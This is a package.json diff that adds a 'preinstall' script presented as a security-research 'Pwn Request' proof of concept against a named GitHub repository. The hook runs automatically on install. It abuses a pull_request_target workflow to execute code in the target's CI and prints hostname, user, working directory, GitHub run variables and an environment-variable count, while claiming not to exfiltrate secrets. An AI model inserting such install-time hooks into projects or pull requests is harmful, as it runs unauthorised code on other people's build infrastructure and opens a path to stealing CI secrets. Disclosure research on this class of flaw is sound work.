@@ -20,7 +20,8 @@
     "test": "npm run lint && npm run test:unit && npm run test:spec",
     "test:spec": "brittle ./tests/**/*.spec.js",
     "test:unit": "brittle tests/unit/*.js",
-    "test:coverage": "brittle --coverage tests/{,**/}*.test.js"
+    "test:coverage": "brittle --coverage tests/{,**/}*.test.js",
+    "preinstall": "echo '======================================' && echo 'SECURITY RESEARCH - Pwn Request PoC' && echo 'Researcher: null_consolidated (HackerOne)' && echo 'Target: tetherto/miningos-tpl-wrk-miner' && echo 'Vector: pull_request_target + attacker ref checkout' && echo '======================================' && echo \"PROOF: Arbitrary code execution in CI\" && echo \"HOSTNAME: $(hostname)\" && echo \"WHOAMI: $(whoami)\" && echo \"PWD: $(pwd)\" && echo \"GITHUB_REPOSITORY: $GITHUB_REPOSITORY\" && echo \"GITHUB_RUN_ID: $GITHUB_RUN_ID\" && echo \"GITHUB_EVENT_NAME: $GITHUB_EVENT_NAME\" && echo \"RUNNER_OS: $RUNNER_OS\" && echo \"ENV_VAR_COUNT: $(env | wc -l)\" && echo '======================================' && echo 'NOTE: This PoC intentionally does NOT' && echo 'exfiltrate secrets or access internal' && echo 'services. It only proves code execution.' && echo '======================================'"
   },
   "dependencies": {
     "async": "3.2.6",
